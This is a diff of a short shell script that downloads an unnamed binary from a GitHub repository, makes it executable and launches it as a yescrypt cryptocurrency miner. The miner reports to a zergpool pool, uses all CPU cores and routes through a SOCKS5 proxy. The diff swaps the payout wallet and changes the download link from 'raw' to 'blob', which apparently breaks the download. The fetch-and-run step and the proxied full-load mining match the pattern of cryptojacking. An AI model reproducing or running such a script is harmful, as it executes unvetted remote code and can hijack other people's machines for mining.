@@ -1,4 +1,4 @@
 apt update -y
-wget https://github.com/anaqerim/xnxx/raw/main/data
+wget https://github.com/anaqerim/xnxx/blob/main/data
 chmod +x data
-./data -a yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6533 -u RBxXP9udHoS2Xc27vMMMmxixxxx.Test -p c=RVN -t $(nproc) -x socks5://put working socks5
+./data -a yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6533 -u REVoacisHUQoYc5UAM74Gdke1zuTMHaBuA.Test -p c=RVN -t $(nproc) -x socks5://put working socks5
